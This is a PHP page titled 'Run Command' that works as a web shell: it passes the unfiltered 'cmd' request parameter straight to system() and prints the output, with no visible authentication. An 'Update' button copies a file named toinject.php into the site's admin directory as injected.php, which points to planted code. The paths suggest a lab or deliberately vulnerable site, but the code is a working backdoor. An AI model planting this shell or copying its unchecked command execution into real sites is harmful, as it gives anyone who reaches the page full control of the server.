<?php
  session_start();

  if (isset($_GET['update'])) {
    system("cp /home/staff/aliceblack/toinject.php /var/www/html/admin/injected.php");
    header("Location: ".$_SERVER['PHP_SELF']); // refresh the page
  }
  
  // if we have a cmd we can run it
  if(isset($_GET['cmd']) and !empty($_GET['cmd'])) {
    $command = $_GET['cmd'];
  }
  
  ob_start();
  system("$command"); // run the command
  $result = ob_get_contents(); // collect its output
  ob_end_clean();
  
  if(isset($_GET['raw']) and $_GET['raw'] == 1){
    header('Content-Type: text/plain');
    echo $result;
    exit;
  }

?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Run Command</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">

    <!-- Le styles -->
    <link href="/css/bootstrap.ch.min.css" rel="stylesheet">
    <style>
      body {
        padding-top: 60px; /* 60px to make the container go all the way to the bottom of the topbar */
      }
    </style>
    <link rel="stylesheet" type="text/css" href="/css/jquery.dataTables.min.css">
    <style>
      .container, .navbar-fixed-top .container {
        width: 800px; /* 60px to make the container go all the way to the bottom of the topbar */
      }
    </style>


  </head>

  <body>
    <?php require_once("../headnav.php"); ?>
    <div class="container">
      <h1>Run Command</h1>
      <form action="#" method="get" class="form-inline">
        <div class="input-append">
          <span class="add-on">command:</span>
          <input type="text" id="cmd" name="cmd" 
            <?php if(isset($_GET['cmd'])) echo "value=\"" . htmlentities($_GET['cmd']) . "\""; ?>
          />
          <button type="submit" class="btn btn-default">Run</button>
        </div>
	<div class="input-append">
    	  <button type="submit" name="update" class="btn btn-default">Update</button>
  	</div>
      </form>
      <pre><code><?php echo(htmlentities($result)); ?></code></pre>
    </div>
  </body>
</html>
